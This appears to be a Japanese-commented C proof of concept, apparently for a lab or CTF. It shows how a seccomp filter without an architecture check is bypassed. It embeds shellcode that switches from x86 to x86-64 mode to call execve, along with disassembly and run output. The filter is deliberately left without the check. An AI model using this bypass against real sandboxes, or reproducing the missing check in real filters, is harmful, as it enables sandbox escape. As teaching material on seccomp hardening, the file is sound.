/* システムコール番号のチェックがバイパス可能であることを検証できるサンプル(x86) */
#include <stdio.h>
#include <stdlib.h>
#include <stddef.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <linux/seccomp.h>
#include <linux/filter.h>
#include <linux/audit.h>
#include <sys/syscall.h>
#include <sys/prctl.h>

// x86-64モードに移行してexecve("./write32", ["./write32", 0], 0) 実行
static unsigned char *sc_x86_64 = "\x6a\x33\xe8\x02\x00\x00\x00\xeb\x01\xcb" 
  "\xeb\x0e\x5f\x6a\x3b\x58\x48\x31\xd2\x52\x57\x48\x89\xe6\x0f\x05\xe8\xed\xff\xff\xff\x2e\x2f\x77\x72\x69\x74\x65\x33\x32"; 
static int enable_seccomp() ;

int main(int argc, char *argv[]) {
	int pid, code, status;
	pid_t result;
	//pid = fork(); // clone(2)
	pid = syscall(SYS_fork); 
	if(pid == -1){ write(2, "ng\n", 3); return 1; }
	if(pid == 0) { // child process
		enable_seccomp();
#if 0
		char *arg[] = {"write32", 0};
		execve("./write32", arg, 0);
#else
		((void (*)(void))sc_x86_64)();
#endif
	} else { // parent process
#if 1
		/* ok */
		char a[256] = {0};
		int fd = open("flag", 0);
		read(fd, &a, 256); 
		write(1, "parent: ", 7);
		write(1, &a, 256);
		close(fd);
#endif
		result = wait4(pid, &status, 0, 0);
	}
	return 0;
}

static int enable_seccomp() {
	int rc=0;
	struct sock_filter filter[] = {
		// アーキテクチャ情報のロード
		//BPF_STMT(BPF_LD | BPF_W | BPF_ABS, (offsetof(struct seccomp_data, arch))),
		// アーキテクチャ情報のチェック(true:1個先へ，false:0個先への意味)
		// アーキテクチャのチェックは必須 
		// チェックが存在しない場合，例えばx86からx64の実行コンテキストにすることでシステムコール番号のチェックすり抜けが起き得る
		//BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, AUDIT_ARCH_I386, 1, 0),
		//BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),
		// システムコール番号のロード
		BPF_STMT(BPF_LD | BPF_W | BPF_ABS, (offsetof(struct seccomp_data, nr))),
		// システムコール番号のチェック
		BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_write, 0, 1),
		BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
		BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_exit_group, 0, 1),
		BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
#if 0
		BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_execve, 0, 1),
		BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
#else
		/// execveのみ使用不可
		BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_execve, 1, 0),
		BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
#endif
		BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),
	};
	struct sock_fprog prog = {
	.len = (unsigned short) (sizeof(filter) / sizeof(filter[0])),
	.filter = filter,
	};
	if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)) {
		perror("prctl(NO_NEW_PRIVS)"); rc=1; goto out;
	}
#if 1
	if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog, 0, 0)) {
		perror("prctl(SECCOMP)"); rc=2;
	}
#else
	if (syscall(__NR_seccomp, SECCOMP_SET_MODE_FILTER,0, &prog)) {
		perror("seccomp"); rc=3;
	}
#endif
out:
	return rc;
}

/*
実行コンテキスト変更(x86->x86-64)のためのshellcode生成

$ as --32 -o x86_to_x86-64.o x86_to_x86-64.s ; objcopy -O binary x86_to_x86-64.o x86_to_x86-64.bin ; objdump -b binary -m i386 -D x86_to_x86-64.bin

x86_to_x86-64.bin:     ファイル形式 binary


セクション .data の逆アセンブル:

00000000 <.data>:
   0:   6a 33                   push   $0x33
   2:   e8 02 00 00 00          call   0x9
   7:   eb 01                   jmp    0xa
   9:   cb                      lret
   a:   c3                      ret

./write32実行のためのshellcode生成

# nasm -o write32_x86_64.o write32_x86_64.s ; objdump -b binary -m i386:x86-64 -D write32_x86_64.o

write32_x86_64.o:     ファイル形式 binary


セクション .data の逆アセンブル:

0000000000000000 <.data>:
   0:   eb 0e                   jmp    0x10
   2:   5f                      pop    %rdi
   3:   6a 3b                   pushq  $0x3b
   5:   58                      pop    %rax
   6:   48 31 d2                xor    %rdx,%rdx
   9:   52                      push   %rdx
   a:   57                      push   %rdi
   b:   48 89 e6                mov    %rsp,%rsi
   e:   0f 05                   syscall
  10:   e8 ed ff ff ff          callq  0x2
  15:   2e 2f                   cs (bad)    ; "./write32"
  17:   77 72                   ja     0x8b
  19:   69                      .byte 0x69
  1a:   74 65                   je     0x81
  1c:   33 32                   xor    (%rdx),%esi


$ seccomp-tools dump ./tp04
parent: line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000000  A = sys_number
 0001: 0x15 0x00 0x01 0x00000004  if (A != write) goto 0003
 0002: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0003: 0x15 0x00 0x01 0x000000fc  if (A != exit_group) goto 0005
 0004: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0005: 0x15 0x01 0x00 0x0000000b  if (A == execve) goto 0007
 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0007: 0x06 0x00 0x00 0x00000000  return KILL


$ ./write32
execve: hogehoge

$ ./tp04
parent:FLAG_GGGGGGGGGGGGGGGG
execve: hogehoge ; チェックをすり抜けてexecve(2)を実行できた

*/
